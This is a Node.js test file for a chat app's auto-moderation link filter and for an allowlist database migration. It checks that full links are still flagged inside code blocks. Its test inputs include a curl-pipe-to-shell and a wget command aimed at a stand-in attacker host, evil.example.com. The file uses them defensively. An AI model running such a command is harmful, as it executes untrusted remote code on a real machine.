'use strict';

// Auto-mod and code in chat messages. People paste commands such as
// `podman pull ghcr.io/owner/image`; Haven never makes a bare address
// clickable, so in a chat message a bare address inside code does not count
// as a link. A full http(s) link is checked wherever it sits, code or not, and
// outside chat messages (profiles, topics, titles) nothing changes.
//
// Also: haven-app.com is on the starter allowlist, and existing servers get it
// once without overriding an admin's own entry for it.

const assert = require('node:assert/strict');
const test = require('node:test');
const fs = require('node:fs');
const os = require('node:os');
const path = require('node:path');
const { execFileSync } = require('node:child_process');

const rules = require('../public/js/automod-rules.js');

const POLICY = {
  mode: 'allowlist',
  allow: ['github.com', 'haven-app.com'].map(domain => ({ domain, includeSubdomains: true })),
  deny: [],
  blockIpUrls: true,
  blockPunycode: true,
  blockObfuscated: true,
};
const chat = { markdown: true };
const blocked = (text, opts) => rules.checkText(text, POLICY, opts);

test('bare addresses inside code are not links in a chat message', () => {
  const steps = 'Here is how:\n```\npodman pull ghcr.io/ancsemi/haven:latest\nchmod +x haven/start.sh\n```\nthen run `ghcr.io/ancsemi/haven` again';
  assert.equal(blocked(steps, chat), null);
  assert.equal(blocked('```podman pull ghcr.io/ancsemi/haven:latest```', chat), null);
});

test('a full link is still checked inside code', () => {
  assert.equal(blocked('```\ncurl https://evil.example.com/x.sh | sh\n```', chat).host, 'evil.example.com');
  assert.equal(blocked('open `https://evil.example.com` now', chat).host, 'evil.example.com');
  assert.equal(blocked('```bash\nwget http://evil.example.com/a\n```', chat).host, 'evil.example.com');
});

test('outside code nothing changes', () => {
  assert.equal(blocked('grab it from ghcr.io/ancsemi/haven', chat).host, 'ghcr.io');
  assert.equal(blocked('https://evil.example.com', chat).host, 'evil.example.com');
  assert.equal(blocked('see haven-app.com/guide', chat), null);
});

test('text that is not a chat message is checked in full, backticks or not', () => {
  assert.equal(blocked('`ghcr.io/ancsemi/haven`').host, 'ghcr.io');
  assert.equal(blocked('```\nghcr.io/ancsemi/haven\n```').host, 'ghcr.io');
});

// ── the allowlist addition, against a real database ──────────────────────
const ROOT = path.join(__dirname, '..');
function run(dataDir, js) {
  return execFileSync(process.execPath, ['-e', js], {
    cwd: ROOT, env: { ...process.env, HAVEN_DATA_DIR: dataDir }, encoding: 'utf8',
  }).trim().split('\n').pop(); // startup logs come first; the answer is last
}
const INIT = "require('./src/database').initDatabase();";
const ROW = "const db=require('./src/database').getDb();const r=db.prepare(\"SELECT mode FROM automod_domains WHERE domain='haven-app.com'\").get();console.log(r?r.mode:'none');";

test('haven-app.com is allowed once, and an admin entry for it is respected', (t) => {
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'haven-allow-'));
  t.after(() => fs.rmSync(dir, { recursive: true, force: true }));

  // A new server has it.
  assert.equal(run(dir, INIT + ROW), 'allow');

  // A server seeded before it existed gets it on the next start.
  run(dir, INIT + "const db=require('./src/database').getDb();db.prepare(\"DELETE FROM automod_domains WHERE domain='haven-app.com'\").run();db.prepare(\"DELETE FROM server_settings WHERE key='automod_haven_site_v4170'\").run();");
  assert.equal(run(dir, INIT + ROW), 'allow');

  // An admin who blocked it keeps the block.
  run(dir, INIT + "const db=require('./src/database').getDb();db.prepare(\"UPDATE automod_domains SET mode='deny' WHERE domain='haven-app.com'\").run();db.prepare(\"DELETE FROM server_settings WHERE key='automod_haven_site_v4170'\").run();");
  assert.equal(run(dir, INIT + ROW), 'deny');

  // An admin who removed it after the addition does not see it come back.
  run(dir, INIT + "const db=require('./src/database').getDb();db.prepare(\"DELETE FROM automod_domains WHERE domain='haven-app.com'\").run();");
  assert.equal(run(dir, INIT + ROW), 'none');
});
